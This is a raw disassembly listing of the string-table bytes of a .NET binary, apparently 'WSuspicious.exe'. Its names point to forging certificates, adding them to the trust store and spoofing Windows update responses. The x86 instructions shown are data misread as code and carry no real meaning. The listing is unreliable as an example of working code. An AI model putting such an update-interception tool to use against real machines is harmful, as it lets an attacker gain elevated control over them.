  4069f6:	46                   	inc    %esi
  4069f7:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4069fe:	00 
  4069ff:	47                   	inc    %edi
  406a00:	65 74 46             	gs je  0x406a49
  406a03:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  406a0a:	00 
  406a0b:	53                   	push   %ebx
  406a0c:	74 6f                	je     0x406a7d
  406a0e:	72 65                	jb     0x406a75
  406a10:	4e                   	dec    %esi
  406a11:	61                   	popa
  406a12:	6d                   	insl   (%dx),%es:(%edi)
  406a13:	65 00 53 75          	add    %dl,%gs:0x75(%ebx)
  406a17:	62 6a 65             	bound  %ebp,0x65(%edx)
  406a1a:	63 74 41 6c          	arpl   %esi,0x6c(%ecx,%eax,2)
  406a1e:	74 65                	je     0x406a85
  406a20:	72 6e                	jb     0x406a90
  406a22:	61                   	popa
  406a23:	74 69                	je     0x406a8e
  406a25:	76 65                	jbe    0x406a8c
  406a27:	4e                   	dec    %esi
  406a28:	61                   	popa
  406a29:	6d                   	insl   (%dx),%es:(%edi)
  406a2a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  406a2e:	74 5f                	je     0x406a8f
  406a30:	4c                   	dec    %esp
  406a31:	6f                   	outsl  %ds:(%esi),(%dx)
  406a32:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  406a35:	4e                   	dec    %esi
  406a36:	61                   	popa
  406a37:	6d                   	insl   (%dx),%es:(%edi)
  406a38:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  406a3c:	6e                   	outsb  %ds:(%esi),(%dx)
  406a3d:	65 72 61             	gs jb  0x406aa1
  406a40:	6c                   	insb   (%dx),%es:(%edi)
  406a41:	4e                   	dec    %esi
  406a42:	61                   	popa
  406a43:	6d                   	insl   (%dx),%es:(%edi)
  406a44:	65 00 69 73          	add    %ch,%gs:0x73(%ecx)
  406a48:	73 75                	jae    0x406abf
  406a4a:	65 72 4e             	gs jb  0x406a9b
  406a4d:	61                   	popa
  406a4e:	6d                   	insl   (%dx),%es:(%edi)
  406a4f:	65 00 73 75          	add    %dh,%gs:0x75(%ebx)
  406a53:	62 6a 65             	bound  %ebp,0x65(%edx)
  406a56:	63 74 4e 61          	arpl   %esi,0x61(%esi,%ecx,2)
  406a5a:	6d                   	insl   (%dx),%es:(%edi)
  406a5b:	65 00 68 6f          	add    %ch,%gs:0x6f(%eax)
  406a5f:	73 74                	jae    0x406ad5
  406a61:	4e                   	dec    %esi
  406a62:	61                   	popa
  406a63:	6d                   	insl   (%dx),%es:(%edi)
  406a64:	65 00 6b 65          	add    %ch,%gs:0x65(%ebx)
  406a68:	79 4e                	jns    0x406ab8
  406a6a:	61                   	popa
  406a6b:	6d                   	insl   (%dx),%es:(%edi)
  406a6c:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  406a70:	74 5f                	je     0x406ad1
  406a72:	53                   	push   %ebx
  406a73:	63 68 65             	arpl   %ebp,0x65(%eax)
  406a76:	6d                   	insl   (%dx),%es:(%edi)
  406a77:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  406a7c:	65 54                	gs push %esp
  406a7e:	69 6d 65 00 4f 6e 65 	imul   $0x656e4f00,0x65(%ebp),%ebp
  406a85:	00 57 72             	add    %dl,0x72(%edi)
  406a88:	69 74 65 4c 69 6e 65 	imul   $0x656e69,0x4c(%ebp,%eiz,2),%esi
  406a8f:	00 
  406a90:	43                   	inc    %ebx
  406a91:	6f                   	outsl  %ds:(%esi),(%dx)
  406a92:	6d                   	insl   (%dx),%es:(%edi)
  406a93:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  406a96:	65 00 49 41          	add    %cl,%gs:0x41(%ecx)
  406a9a:	73 79                	jae    0x406b15
  406a9c:	6e                   	outsb  %ds:(%esi),(%dx)
  406a9d:	63 53 74             	arpl   %edx,0x74(%ebx)
  406aa0:	61                   	popa
  406aa1:	74 65                	je     0x406b08
  406aa3:	4d                   	dec    %ebp
  406aa4:	61                   	popa
  406aa5:	63 68 69             	arpl   %ebp,0x69(%eax)
  406aa8:	6e                   	outsb  %ds:(%esi),(%dx)
  406aa9:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  406aad:	74 53                	je     0x406b02
  406aaf:	74 61                	je     0x406b12
  406ab1:	74 65                	je     0x406b18
  406ab3:	4d                   	dec    %ebp
  406ab4:	61                   	popa
  406ab5:	63 68 69             	arpl   %ebp,0x69(%eax)
  406ab8:	6e                   	outsb  %ds:(%esi),(%dx)
  406ab9:	65 00 73 74          	add    %dh,%gs:0x74(%ebx)
  406abd:	61                   	popa
  406abe:	74 65                	je     0x406b25
  406ac0:	4d                   	dec    %ebp
  406ac1:	61                   	popa
  406ac2:	63 68 69             	arpl   %ebp,0x69(%eax)
  406ac5:	6e                   	outsb  %ds:(%esi),(%dx)
  406ac6:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  406aca:	74 54                	je     0x406b20
  406acc:	79 70                	jns    0x406b3e
  406ace:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  406ad2:	74 5f                	je     0x406b33
  406ad4:	43                   	inc    %ebx
  406ad5:	6f                   	outsl  %ds:(%esi),(%dx)
  406ad6:	6e                   	outsb  %ds:(%esi),(%dx)
  406ad7:	74 65                	je     0x406b3e
  406ad9:	6e                   	outsb  %ds:(%esi),(%dx)
  406ada:	74 54                	je     0x406b30
  406adc:	79 70                	jns    0x406b4e
  406ade:	65 00 57 68          	add    %dl,%gs:0x68(%edi)
  406ae2:	65 72 65             	gs jb  0x406b4a
  406ae5:	00 53 79             	add    %dl,0x79(%ebx)
  406ae8:	73 74                	jae    0x406b5e
  406aea:	65 6d                	gs insl (%dx),%es:(%edi)
  406aec:	2e 43                	cs inc %ebx
  406aee:	6f                   	outsl  %ds:(%esi),(%dx)
  406aef:	72 65                	jb     0x406b56
  406af1:	00 53 65             	add    %dl,0x65(%ebx)
  406af4:	74 4e                	je     0x406b44
  406af6:	6f                   	outsl  %ds:(%esi),(%dx)
  406af7:	74 42                	je     0x406b3b
  406af9:	65 66 6f             	outsw  %gs:(%esi),(%dx)
  406afc:	72 65                	jb     0x406b63
  406afe:	00 50 6b             	add    %dl,0x6b(%eax)
  406b01:	63 73 31             	arpl   %esi,0x31(%ebx)
  406b04:	32 53 74             	xor    0x74(%ebx),%dl
  406b07:	6f                   	outsl  %ds:(%esi),(%dx)
  406b08:	72 65                	jb     0x406b6f
  406b0a:	00 58 35             	add    %bl,0x35(%eax)
  406b0d:	30 39                	xor    %bh,(%ecx)
  406b0f:	53                   	push   %ebx
  406b10:	74 6f                	je     0x406b81
  406b12:	72 65                	jb     0x406b79
  406b14:	00 52 65             	add    %dl,0x65(%edx)
  406b17:	6d                   	insl   (%dx),%es:(%edi)
  406b18:	6f                   	outsl  %ds:(%esi),(%dx)
  406b19:	76 65                	jbe    0x406b80
  406b1b:	46                   	inc    %esi
  406b1c:	72 6f                	jb     0x406b8d
  406b1e:	6d                   	insl   (%dx),%es:(%edi)
  406b1f:	54                   	push   %esp
  406b20:	72 75                	jb     0x406b97
  406b22:	73 74                	jae    0x406b98
  406b24:	53                   	push   %ebx
  406b25:	74 6f                	je     0x406b96
  406b27:	72 65                	jb     0x406b8e
  406b29:	00 41 64             	add    %al,0x64(%ecx)
  406b2c:	64 54                	fs push %esp
  406b2e:	6f                   	outsl  %ds:(%esi),(%dx)
  406b2f:	54                   	push   %esp
  406b30:	72 75                	jb     0x406ba7
  406b32:	73 74                	jae    0x406ba8
  406b34:	53                   	push   %ebx
  406b35:	74 6f                	je     0x406ba6
  406b37:	72 65                	jb     0x406b9e
  406b39:	00 52 73             	add    %dl,0x73(%edx)
  406b3c:	61                   	popa
  406b3d:	50                   	push   %eax
  406b3e:	72 69                	jb     0x406ba9
  406b40:	76 61                	jbe    0x406ba3
  406b42:	74 65                	je     0x406ba9
  406b44:	4b                   	dec    %ebx
  406b45:	65 79 53             	gs jns 0x406b9b
  406b48:	74 72                	je     0x406bbc
  406b4a:	75 63                	jne    0x406baf
  406b4c:	74 75                	je     0x406bc3
  406b4e:	72 65                	jb     0x406bb5
  406b50:	00 52 65             	add    %dl,0x65(%edx)
  406b53:	71 75                	jno    0x406bca
  406b55:	65 73 74             	gs jae 0x406bcc
  406b58:	52                   	push   %edx
  406b59:	65 73 70             	gs jae 0x406bcc
  406b5c:	6f                   	outsl  %ds:(%esi),(%dx)
  406b5d:	6e                   	outsb  %ds:(%esi),(%dx)
  406b5e:	73 65                	jae    0x406bc5
  406b60:	42                   	inc    %edx
  406b61:	61                   	popa
  406b62:	73 65                	jae    0x406bc9
  406b64:	00 53 65             	add    %dl,0x65(%ebx)
  406b67:	73 73                	jae    0x406bdc
  406b69:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  406b70:	74 41                	je     0x406bb3
  406b72:	72 67                	jb     0x406bdb
  406b74:	73 42                	jae    0x406bb8
  406b76:	61                   	popa
  406b77:	73 65                	jae    0x406bde
  406b79:	00 52 65             	add    %dl,0x65(%edx)
  406b7c:	6c                   	insb   (%dx),%es:(%edi)
  406b7d:	65 61                	gs popa
  406b7f:	73 65                	jae    0x406be6
  406b81:	00 67 65             	add    %ah,0x65(%edi)
  406b84:	74 5f                	je     0x406be5
  406b86:	52                   	push   %edx
  406b87:	65 73 70             	gs jae 0x406bfa
  406b8a:	6f                   	outsl  %ds:(%esi),(%dx)
  406b8b:	6e                   	outsb  %ds:(%esi),(%dx)
  406b8c:	73 65                	jae    0x406bf3
  406b8e:	00 61 64             	add    %ah,0x64(%ecx)
  406b91:	64 5f                	fs pop %edi
  406b93:	42                   	inc    %edx
  406b94:	65 66 6f             	outsw  %gs:(%esi),(%dx)
  406b97:	72 65                	jb     0x406bfe
  406b99:	52                   	push   %edx
  406b9a:	65 73 70             	gs jae 0x406c0d
  406b9d:	6f                   	outsl  %ds:(%esi),(%dx)
  406b9e:	6e                   	outsb  %ds:(%esi),(%dx)
  406b9f:	73 65                	jae    0x406c06
  406ba1:	00 72 65             	add    %dh,0x65(%edx)
  406ba4:	6d                   	insl   (%dx),%es:(%edi)
  406ba5:	6f                   	outsl  %ds:(%esi),(%dx)
  406ba6:	76 65                	jbe    0x406c0d
  406ba8:	5f                   	pop    %edi
  406ba9:	42                   	inc    %edx
  406baa:	65 66 6f             	outsw  %gs:(%esi),(%dx)
  406bad:	72 65                	jb     0x406c14
  406baf:	52                   	push   %edx
  406bb0:	65 73 70             	gs jae 0x406c23
  406bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  406bb4:	6e                   	outsb  %ds:(%esi),(%dx)
  406bb5:	73 65                	jae    0x406c1c
  406bb7:	00 6f 6e             	add    %ch,0x6e(%edi)
  406bba:	52                   	push   %edx
  406bbb:	65 73 70             	gs jae 0x406c2e
  406bbe:	6f                   	outsl  %ds:(%esi),(%dx)
  406bbf:	6e                   	outsb  %ds:(%esi),(%dx)
  406bc0:	73 65                	jae    0x406c27
  406bc2:	00 48 74             	add    %cl,0x74(%eax)
  406bc5:	74 70                	je     0x406c37
  406bc7:	4c                   	dec    %esp
  406bc8:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  406bcf:	52                   	push   %edx
  406bd0:	65 73 70             	gs jae 0x406c43
  406bd3:	6f                   	outsl  %ds:(%esi),(%dx)
  406bd4:	6e                   	outsb  %ds:(%esi),(%dx)
  406bd5:	73 65                	jae    0x406c3c
  406bd7:	00 43 6c             	add    %al,0x6c(%ebx)
  406bda:	6f                   	outsl  %ds:(%esi),(%dx)
  406bdb:	73 65                	jae    0x406c42
  406bdd:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  406be1:	70 6f                	jo     0x406c52
  406be3:	73 65                	jae    0x406c4a
  406be5:	00 54 72 79          	add    %dl,0x79(%edx,%esi,2)
  406be9:	50                   	push   %eax
  406bea:	61                   	popa
  406beb:	72 73                	jb     0x406c60
  406bed:	65 00 70 61          	add    %dh,%gs:0x61(%eax)
  406bf1:	72 73                	jb     0x406c66
  406bf3:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  406bf7:	30 39                	xor    %bh,(%ecx)
  406bf9:	43                   	inc    %ebx
  406bfa:	65 72 74             	gs jb  0x406c71
  406bfd:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406c04:	00 73 65             	add    %dh,0x65(%ebx)
  406c07:	74 5f                	je     0x406c68
  406c09:	47                   	inc    %edi
  406c0a:	65 6e                	outsb  %gs:(%esi),(%dx)
  406c0c:	65 72 69             	gs jb  0x406c78
  406c0f:	63 43 65             	arpl   %eax,0x65(%ebx)
  406c12:	72 74                	jb     0x406c88
  406c14:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406c1b:	00 4d 61             	add    %cl,0x61(%ebp)
  406c1e:	6b 65 43 65          	imul   $0x65,0x43(%ebp),%esp
  406c22:	72 74                	jb     0x406c98
  406c24:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406c2b:	00 67 65             	add    %ah,0x65(%edi)
  406c2e:	6e                   	outsb  %ds:(%esi),(%dx)
  406c2f:	65 72 61             	gs jb  0x406c93
  406c32:	74 65                	je     0x406c99
  406c34:	43                   	inc    %ebx
  406c35:	65 72 74             	gs jb  0x406cac
  406c38:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406c3f:	00 63 65             	add    %ah,0x65(%ebx)
  406c42:	72 74                	jb     0x406cb8
  406c44:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406c4b:	00 43 72             	add    %al,0x72(%ebx)
  406c4e:	65 61                	gs popa
  406c50:	74 65                	je     0x406cb7
  406c52:	00 45 78             	add    %al,0x78(%ebp)
  406c55:	74 65                	je     0x406cbc
  406c57:	6e                   	outsb  %ds:(%esi),(%dx)
  406c58:	64 65 64 55          	fs gs fs push %ebp
  406c5c:	70 64                	jo     0x406cc2
  406c5e:	61                   	popa
  406c5f:	74 65                	je     0x406cc6
  406c61:	49                   	dec    %ecx
  406c62:	6e                   	outsb  %ds:(%esi),(%dx)
  406c63:	66 6f                	outsw  %ds:(%esi),(%dx)
  406c65:	54                   	push   %esp
  406c66:	65 6d                	gs insl (%dx),%es:(%edi)
  406c68:	70 6c                	jo     0x406cd6
  406c6a:	61                   	popa
  406c6b:	74 65                	je     0x406cd2
  406c6d:	00 4e 65             	add    %cl,0x65(%esi)
  406c70:	77 55                	ja     0x406cc7
  406c72:	70 64                	jo     0x406cd8
  406c74:	61                   	popa
  406c75:	74 65                	je     0x406cdc
  406c77:	73 54                	jae    0x406ccd
  406c79:	65 6d                	gs insl (%dx),%es:(%edi)
  406c7b:	70 6c                	jo     0x406ce9
  406c7d:	61                   	popa
  406c7e:	74 65                	je     0x406ce5
  406c80:	00 47 65             	add    %al,0x65(%edi)
  406c83:	6e                   	outsb  %ds:(%esi),(%dx)
  406c84:	65 72 61             	gs jb  0x406ce8
  406c87:	74 65                	je     0x406cee
  406c89:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  406c8c:	31 5f 5f             	xor    %ebx,0x5f(%edi)
  406c8f:	73 74                	jae    0x406d05
  406c91:	61                   	popa
  406c92:	74 65                	je     0x406cf9
  406c94:	00 67 65             	add    %ah,0x65(%edi)
  406c97:	74 5f                	je     0x406cf8
  406c99:	50                   	push   %eax
  406c9a:	72 69                	jb     0x406d05
  406c9c:	76 61                	jbe    0x406cff
  406c9e:	74 65                	je     0x406d05
  406ca0:	00 45 6d             	add    %al,0x6d(%ebp)
  406ca3:	62 65 64             	bound  %esp,0x64(%ebp)
  406ca6:	64 65 64 41          	fs gs fs inc %ecx
  406caa:	74 74                	je     0x406d20
  406cac:	72 69                	jb     0x406d17
  406cae:	62 75 74             	bound  %esi,0x74(%ebp)
  406cb1:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  406cb5:	6d                   	insl   (%dx),%es:(%edi)
  406cb6:	70 69                	jo     0x406d21
  406cb8:	6c                   	insb   (%dx),%es:(%edi)
  406cb9:	65 72 47             	gs jb  0x406d03
  406cbc:	65 6e                	outsb  %gs:(%esi),(%dx)
  406cbe:	65 72 61             	gs jb  0x406d22
  406cc1:	74 65                	je     0x406d28
  406cc3:	64 41                	fs inc %ecx
  406cc5:	74 74                	je     0x406d3b
  406cc7:	72 69                	jb     0x406d32
  406cc9:	62 75 74             	bound  %esi,0x74(%ebp)
  406ccc:	65 00 41 74          	add    %al,%gs:0x74(%ecx)
  406cd0:	74 72                	je     0x406d44
  406cd2:	69 62 75 74 65 55 73 	imul   $0x73556574,0x75(%edx),%esp
  406cd9:	61                   	popa
  406cda:	67 65 41             	addr16 gs inc %ecx
  406cdd:	74 74                	je     0x406d53
  406cdf:	72 69                	jb     0x406d4a
  406ce1:	62 75 74             	bound  %esi,0x74(%ebp)
  406ce4:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  406ce9:	75 67                	jne    0x406d52
  406ceb:	67 61                	addr16 popa
  406ced:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  406cf1:	74 74                	je     0x406d67
  406cf3:	72 69                	jb     0x406d5e
  406cf5:	62 75 74             	bound  %esi,0x74(%ebp)
  406cf8:	65 00 4e 75          	add    %cl,%gs:0x75(%esi)
  406cfc:	6c                   	insb   (%dx),%es:(%edi)
  406cfd:	6c                   	insb   (%dx),%es:(%edi)
  406cfe:	61                   	popa
  406cff:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  406d03:	74 74                	je     0x406d79
  406d05:	72 69                	jb     0x406d70
  406d07:	62 75 74             	bound  %esi,0x74(%ebp)
  406d0a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406d0e:	73 65                	jae    0x406d75
  406d10:	6d                   	insl   (%dx),%es:(%edi)
  406d11:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  406d15:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  406d1c:	72 
  406d1d:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  406d24:	73 79                	jae    0x406d9f
  406d26:	6e                   	outsb  %ds:(%esi),(%dx)
  406d27:	63 53 74             	arpl   %edx,0x74(%ebx)
  406d2a:	61                   	popa
  406d2b:	74 65                	je     0x406d92
  406d2d:	4d                   	dec    %ebp
  406d2e:	61                   	popa
  406d2f:	63 68 69             	arpl   %ebp,0x69(%eax)
  406d32:	6e                   	outsb  %ds:(%esi),(%dx)
  406d33:	65 41                	gs inc %ecx
  406d35:	74 74                	je     0x406dab
  406d37:	72 69                	jb     0x406da2
  406d39:	62 75 74             	bound  %esi,0x74(%ebp)
  406d3c:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  406d41:	75 67                	jne    0x406daa
  406d43:	67 65 72 53          	addr16 gs jb 0x406d9a
  406d47:	74 65                	je     0x406dae
  406d49:	70 54                	jo     0x406d9f
  406d4b:	68 72 6f 75 67       	push   $0x67756f72
  406d50:	68 41 74 74 72       	push   $0x72747441
  406d55:	69 62 75 74 65 00 54 	imul   $0x54006574,0x75(%edx),%esp
  406d5c:	61                   	popa
  406d5d:	72 67                	jb     0x406dc6
  406d5f:	65 74 46             	gs je  0x406da8
  406d62:	72 61                	jb     0x406dc5
  406d64:	6d                   	insl   (%dx),%es:(%edi)
  406d65:	65 77 6f             	gs ja  0x406dd7
  406d68:	72 6b                	jb     0x406dd5
  406d6a:	41                   	inc    %ecx
  406d6b:	74 74                	je     0x406de1
  406d6d:	72 69                	jb     0x406dd8
  406d6f:	62 75 74             	bound  %esi,0x74(%ebp)
  406d72:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  406d77:	75 67                	jne    0x406de0
  406d79:	67 65 72 48          	addr16 gs jb 0x406dc5
  406d7d:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  406d84:	74 
  406d85:	72 69                	jb     0x406df0
  406d87:	62 75 74             	bound  %esi,0x74(%ebp)
  406d8a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406d8e:	73 65                	jae    0x406df5
  406d90:	6d                   	insl   (%dx),%es:(%edi)
  406d91:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  406d95:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  406d9c:	69 
  406d9d:	6f                   	outsl  %ds:(%esi),(%dx)
  406d9e:	6e                   	outsb  %ds:(%esi),(%dx)
  406d9f:	41                   	inc    %ecx
  406da0:	74 74                	je     0x406e16
  406da2:	72 69                	jb     0x406e0d
  406da4:	62 75 74             	bound  %esi,0x74(%ebp)
  406da7:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406dab:	73 65                	jae    0x406e12
  406dad:	6d                   	insl   (%dx),%es:(%edi)
  406dae:	62 6c 79 49          	bound  %ebp,0x49(%ecx,%edi,2)
  406db2:	6e                   	outsb  %ds:(%esi),(%dx)
  406db3:	66 6f                	outsw  %ds:(%esi),(%dx)
  406db5:	72 6d                	jb     0x406e24
  406db7:	61                   	popa
  406db8:	74 69                	je     0x406e23
  406dba:	6f                   	outsl  %ds:(%esi),(%dx)
  406dbb:	6e                   	outsb  %ds:(%esi),(%dx)
  406dbc:	61                   	popa
  406dbd:	6c                   	insb   (%dx),%es:(%edi)
  406dbe:	56                   	push   %esi
  406dbf:	65 72 73             	gs jb  0x406e35
  406dc2:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  406dc9:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  406dd0:	73 73                	jae    0x406e45
  406dd2:	65 6d                	gs insl (%dx),%es:(%edi)
  406dd4:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  406dd8:	6f                   	outsl  %ds:(%esi),(%dx)
  406dd9:	6e                   	outsb  %ds:(%esi),(%dx)
  406dda:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  406de0:	74 69                	je     0x406e4b
  406de2:	6f                   	outsl  %ds:(%esi),(%dx)
  406de3:	6e                   	outsb  %ds:(%esi),(%dx)
  406de4:	41                   	inc    %ecx
  406de5:	74 74                	je     0x406e5b
  406de7:	72 69                	jb     0x406e52
  406de9:	62 75 74             	bound  %esi,0x74(%ebp)
  406dec:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  406df0:	6d                   	insl   (%dx),%es:(%edi)
  406df1:	70 69                	jo     0x406e5c
  406df3:	6c                   	insb   (%dx),%es:(%edi)
  406df4:	61                   	popa
  406df5:	74 69                	je     0x406e60
  406df7:	6f                   	outsl  %ds:(%esi),(%dx)
  406df8:	6e                   	outsb  %ds:(%esi),(%dx)
  406df9:	52                   	push   %edx
  406dfa:	65 6c                	gs insb (%dx),%es:(%edi)
  406dfc:	61                   	popa
  406dfd:	78 61                	js     0x406e60
  406dff:	74 69                	je     0x406e6a
  406e01:	6f                   	outsl  %ds:(%esi),(%dx)
  406e02:	6e                   	outsb  %ds:(%esi),(%dx)
  406e03:	73 41                	jae    0x406e46
  406e05:	74 74                	je     0x406e7b
  406e07:	72 69                	jb     0x406e72
  406e09:	62 75 74             	bound  %esi,0x74(%ebp)
  406e0c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406e10:	73 65                	jae    0x406e77
  406e12:	6d                   	insl   (%dx),%es:(%edi)
  406e13:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  406e17:	72 6f                	jb     0x406e88
  406e19:	64 75 63             	fs jne 0x406e7f
  406e1c:	74 41                	je     0x406e5f
  406e1e:	74 74                	je     0x406e94
  406e20:	72 69                	jb     0x406e8b
  406e22:	62 75 74             	bound  %esi,0x74(%ebp)
  406e25:	65 00 4e 75          	add    %cl,%gs:0x75(%esi)
  406e29:	6c                   	insb   (%dx),%es:(%edi)
  406e2a:	6c                   	insb   (%dx),%es:(%edi)
  406e2b:	61                   	popa
  406e2c:	62 6c 65 43          	bound  %ebp,0x43(%ebp,%eiz,2)
  406e30:	6f                   	outsl  %ds:(%esi),(%dx)
  406e31:	6e                   	outsb  %ds:(%esi),(%dx)
  406e32:	74 65                	je     0x406e99
  406e34:	78 74                	js     0x406eaa
  406e36:	41                   	inc    %ecx
  406e37:	74 74                	je     0x406ead
  406e39:	72 69                	jb     0x406ea4
  406e3b:	62 75 74             	bound  %esi,0x74(%ebp)
  406e3e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406e42:	73 65                	jae    0x406ea9
  406e44:	6d                   	insl   (%dx),%es:(%edi)
  406e45:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  406e49:	6f                   	outsl  %ds:(%esi),(%dx)
  406e4a:	6d                   	insl   (%dx),%es:(%edi)
  406e4b:	70 61                	jo     0x406eae
  406e4d:	6e                   	outsb  %ds:(%esi),(%dx)
  406e4e:	79 41                	jns    0x406e91
  406e50:	74 74                	je     0x406ec6
  406e52:	72 69                	jb     0x406ebd
  406e54:	62 75 74             	bound  %esi,0x74(%ebp)
  406e57:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  406e5b:	6e                   	outsb  %ds:(%esi),(%dx)
  406e5c:	74 69                	je     0x406ec7
  406e5e:	6d                   	insl   (%dx),%es:(%edi)
  406e5f:	65 43                	gs inc %ebx
  406e61:	6f                   	outsl  %ds:(%esi),(%dx)
  406e62:	6d                   	insl   (%dx),%es:(%edi)
  406e63:	70 61                	jo     0x406ec6
  406e65:	74 69                	je     0x406ed0
  406e67:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  406e6a:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  406e71:	69 
  406e72:	62 75 74             	bound  %esi,0x74(%ebp)
  406e75:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  406e79:	74 65                	je     0x406ee0
  406e7b:	00 67 65             	add    %ah,0x65(%edi)
  406e7e:	74 5f                	je     0x406edf
  406e80:	56                   	push   %esi
  406e81:	61                   	popa
  406e82:	6c                   	insb   (%dx),%es:(%edi)
  406e83:	75 65                	jne    0x406eea
  406e85:	00 67 65             	add    %ah,0x65(%edi)
  406e88:	74 5f                	je     0x406ee9
  406e8a:	48                   	dec    %eax
  406e8b:	61                   	popa
  406e8c:	73 56                	jae    0x406ee4
  406e8e:	61                   	popa
  406e8f:	6c                   	insb   (%dx),%es:(%edi)
  406e90:	75 65                	jne    0x406ef7
  406e92:	00 47 65             	add    %al,0x65(%edi)
  406e95:	74 56                	je     0x406eed
  406e97:	61                   	popa
  406e98:	6c                   	insb   (%dx),%es:(%edi)
  406e99:	75 65                	jne    0x406f00
  406e9b:	00 53 65             	add    %dl,0x65(%ebx)
  406e9e:	74 56                	je     0x406ef6
  406ea0:	61                   	popa
  406ea1:	6c                   	insb   (%dx),%es:(%edi)
  406ea2:	75 65                	jne    0x406f09
  406ea4:	00 53 61             	add    %dl,0x61(%ebx)
  406ea7:	76 65                	jbe    0x406f0e
  406ea9:	00 52 65             	add    %dl,0x65(%edx)
  406eac:	6d                   	insl   (%dx),%es:(%edi)
  406ead:	6f                   	outsl  %ds:(%esi),(%dx)
  406eae:	76 65                	jbe    0x406f15
  406eb0:	00 57 53             	add    %dl,0x53(%edi)
  406eb3:	75 73                	jne    0x406f28
  406eb5:	70 69                	jo     0x406f20
  406eb7:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  406eba:	75 73                	jne    0x406f2f
  406ebc:	2e 65 78 65          	cs js,pn 0x406f25
  406ec0:	00 56 61             	add    %dl,0x61(%esi)
  406ec3:	6c                   	insb   (%dx),%es:(%edi)
  406ec4:	75 65                	jne    0x406f2b
  406ec6:	4f                   	dec    %edi
  406ec7:	66 00 49 6e          	data16 add %cl,0x6e(%ecx)
  406ecb:	64 65 78 4f          	fs gs js 0x406f1e
  406ecf:	66 00 46 6c          	data16 add %al,0x6c(%esi)
  406ed3:	61                   	popa
  406ed4:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  406ed8:	73 74                	jae    0x406f4e
  406eda:	65 6d                	gs insl (%dx),%es:(%edi)
  406edc:	2e 54                	cs push %esp
  406ede:	68 72 65 61 64       	push   $0x64616572
  406ee3:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  406eea:	5f                   	pop    %edi
  406eeb:	43                   	inc    %ebx
  406eec:	6f                   	outsl  %ds:(%esi),(%dx)
  406eed:	6e                   	outsb  %ds:(%esi),(%dx)
  406eee:	74 65                	je     0x406f55
  406ef0:	6e                   	outsb  %ds:(%esi),(%dx)
  406ef1:	74 45                	je     0x406f38
  406ef3:	6e                   	outsb  %ds:(%esi),(%dx)
  406ef4:	63 6f 64             	arpl   %ebp,0x64(%edi)
  406ef7:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  406efe:	74 65                	je     0x406f65
  406f00:	6d                   	insl   (%dx),%es:(%edi)
  406f01:	2e 52                	cs push %edx
  406f03:	75 6e                	jne    0x406f73
  406f05:	74 69                	je     0x406f70
  406f07:	6d                   	insl   (%dx),%es:(%edi)
  406f08:	65 2e 56             	gs cs push %esi
  406f0b:	65 72 73             	gs jb  0x406f81
  406f0e:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  406f15:	54                   	push   %esp
  406f16:	6f                   	outsl  %ds:(%esi),(%dx)
  406f17:	42                   	inc    %edx
  406f18:	61                   	popa
  406f19:	73 65                	jae    0x406f80
